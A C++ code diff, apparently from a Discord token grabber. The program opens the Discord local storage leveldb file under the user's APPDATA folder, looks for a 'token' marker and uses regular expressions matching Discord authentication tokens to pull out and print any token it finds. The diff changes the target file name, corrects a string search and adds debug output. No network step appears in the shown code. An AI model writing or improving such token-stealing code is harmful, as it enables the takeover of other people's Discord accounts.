@@ -1,16 +1,15 @@
 #include <iostream>
 #include <fstream>
 #include <string>
-#include <regex>
-#include <streambuf>
+#include <regex>    
     
 using namespace std;
     size_t sz = 0;
-    char* szBuf;
+    char* szBuf;    
     errno_t environment = _dupenv_s(&szBuf, &sz, "APPDATA");
     string AppData = szBuf;
-    string leveldb = AppData + "/Discord/Local Storage/leveldb/002487.ldb";
-    string token = "oken";
+    string leveldb = AppData + "/Discord/Local Storage/leveldb/000005.ldb";
+    string token = "[oken";
     string line;
 
 int main()
@@ -18,10 +17,12 @@ int main()
     smatch smatch;
     try {
         ifstream file(leveldb);
+
         if (file.is_open()) {
-            while (getline(file, line)) {
+            if (getline(file, line)) {
                 cout << line << '\n';
-                if (line.find(token)) {
+                if (line.find(token, 0) != string::npos) {
+                    cout << token << '\n';
                     regex x(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})");
                     if (regex_search(line, smatch, x) == true) {
                         cout << smatch.str() << '\n';
@@ -30,9 +31,11 @@ int main()
                         if (regex_search(line, smatch, y) == true) {
                             cout << smatch.str() << '\n';
                         } else {
-                            cout << "Not Found" << '\n';
+                            cout << "[REGEX] Not Found" << '\n';
                         }
                     }
+                } else{
+                    cout << "[TOKEN] Not Found" << '\n';
                 }
             } file.close();
         }
